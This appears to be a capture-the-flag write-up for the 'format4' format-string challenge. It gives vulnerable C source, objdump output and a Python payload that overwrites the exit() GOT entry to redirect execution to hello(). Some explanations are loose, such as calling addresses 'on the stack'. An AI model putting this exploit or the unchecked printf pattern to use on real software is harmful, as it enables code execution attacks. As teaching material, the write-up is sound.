# format4

## Enumeration
The code:<br>
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}
```
The goal of this challenge is to overwrite the procedure linkage table (PLT) with a specific value to alter code execution. As seen from the code we want to redirect code execution to <b>hello</b> by overwriting <b>exit(1)</b> PLT entry. First determine where hello and exit exists on the stack.
```bash
maximillian@maximillian-VirtualBox: objdump -TR format4

DYNAMIC SYMBOL TABLE:
00000000  w   D  *UND*  00000000              __gmon_start__
00000000      DF *UND*  00000000  GLIBC_2.0   fgets
00000000      DF *UND*  00000000  GLIBC_2.0   __libc_start_main
00000000      DF *UND*  00000000  GLIBC_2.0   _exit
00000000      DF *UND*  00000000  GLIBC_2.0   printf
00000000      DF *UND*  00000000  GLIBC_2.0   puts
00000000      DF *UND*  00000000  GLIBC_2.0   exit
080485ec g    DO .rodata        00000004  Base        _IO_stdin_used
08049730 g    DO .bss   00000004  GLIBC_2.0   stdin

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin@@GLIBC_2.0
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets@GLIBC_2.0
08049714 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
08049718 R_386_JUMP_SLOT   _exit@GLIBC_2.0
0804971c R_386_JUMP_SLOT   printf@GLIBC_2.0
08049720 R_386_JUMP_SLOT   puts@GLIBC_2.0
08049724 R_386_JUMP_SLOT   exit@GLIBC_2.0


maximillian@maximillian-VirtualBox: objdump -t format4 | grep .text

08048400 l    d  .text  00000000              .text
08048430 l     F .text  00000000              __do_global_dtors_aux
08048490 l     F .text  00000000              frame_dummy
080485a0 l     F .text  00000000              __do_global_ctors_aux
08048530 g     F .text  00000005              __libc_csu_fini
08048400 g     F .text  00000000              _start
08048540 g     F .text  0000005a              __libc_csu_init
080484b4 g     F .text  0000001e              hello
080484d2 g     F .text  00000042              vuln
0804859a g     F .text  00000000              .hidden __i686.get_pc_thunk.bx
08048514 g     F .text  0000000f              main
```
hello is located at 0x080484b4. So we want to rewrite 0x08049724 (which is a pointer to the code executed by exit) to 0x080484b4. The full exploit script is below. One thing to note is th <b>exploit += %4$n</b> which means "At location 4, write n bytes". This method is called Direct Parameter Access and (as the name implies) allows for accessing parameters on the stack directly. This method can be used to shorten the exploit script.

```Python
#!/usr/bin/env python

import struct
exit_location_0 = struct.pack("I",0x08049724)
exit_location_1 = struct.pack("I",0x08049726)

hello_location = struct.pack("I",0x080484b4)

exploit = ""
exploit += exit_location_0
exploit += exit_location_1
exploit += "%33964x"
exploit += "%4$n"
exploit += "%33616x"
exploit += "%5$n"

print exploit
```